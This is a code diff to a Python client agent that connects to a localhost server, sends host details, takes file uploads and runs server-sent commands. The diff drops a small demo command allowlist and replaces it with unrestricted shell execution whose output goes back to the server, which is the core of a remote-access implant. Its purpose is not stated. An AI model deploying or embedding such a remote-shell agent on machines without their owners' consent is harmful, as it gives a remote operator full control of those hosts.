@@ -3,6 +3,7 @@ import json
 import os
 import platform
 import socket
+import subprocess
 import time
 import uuid
 
@@ -13,8 +14,10 @@ from upload_handler import handle_upload_file
 
 
 
-SERVER_URL = "http://127.0.0.1:8080"
+SERVER_URL = "http://127.0.0.1:4926"
 RECONNECT_DELAY = 3
+COMMAND_TIMEOUT = 30
+MAX_OUTPUT_BYTES = 100_000
 
 
 AGENT_ID = str(uuid.uuid4())
@@ -74,16 +77,16 @@ def collect_info():
 def run_command(command_obj):
     """
     Execute command from server
-    
+
     Args:
         command_obj: Can be string (legacy) or dict with 'command' key
-    
+
     Returns:
         Result or dict with status
     """
     if isinstance(command_obj, dict):
         command = command_obj.get('command', '').strip()
-        
+
         # Handle file upload
         if command == 'agent.upload':
             return handle_upload_file(
@@ -91,34 +94,57 @@ def run_command(command_obj):
                 command_obj.get('file_data'),
                 command_obj.get('file_size')
             )
-        
-        # Legacy command format (for future expansion)
-        return run_demo_command(command)
-    
+
+        return execute_command(command)
+
     else:
         # String format (legacy)
-        return run_demo_command(command_obj)
+        return execute_command(command_obj)
 
 
-def run_demo_command(command):
-    command = command.strip()
+def execute_command(command):
+    """
+    Run an OS command through the system shell.
+
+    Args:
+        command: Command line to run (pipes, redirection and chaining work)
+
+    Returns:
+        Combined stdout/stderr with exit status, or "agent.exit"
+    """
+    command = (command or "").strip()
+
+    if not command:
+        return "Empty command"
 
     if command == "agent.exit":
-
         return "agent.exit"
 
-    if command == "whoami":
-        return getpass.getuser()
-    if command == "hostname":
-        return socket.gethostname()
-    if command == "pwd":
-        return os.getcwd()
-    if command == "platform":
-        return platform.platform()
-    if command.startswith("echo "):
-        return command[5:]
+    try:
+        completed = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            errors="replace",
+            timeout=COMMAND_TIMEOUT,
+        )
+    except subprocess.TimeoutExpired:
+        return f"Command timed out after {COMMAND_TIMEOUT}s: {command}"
+    except OSError as e:
+        return f"Failed to run command: {e}"
 
-    return f"Unsupported demo command: {command}"
+    output = (completed.stdout or "") + (completed.stderr or "")
+
+    if not output.strip():
+        output = f"[no output, exit code {completed.returncode}]"
+    elif completed.returncode != 0:
+        output += f"\n[exit code {completed.returncode}]"
+
+    if len(output) > MAX_OUTPUT_BYTES:
+        output = output[:MAX_OUTPUT_BYTES] + "\n[output truncated]"
+
+    return output
 
 
 def register():
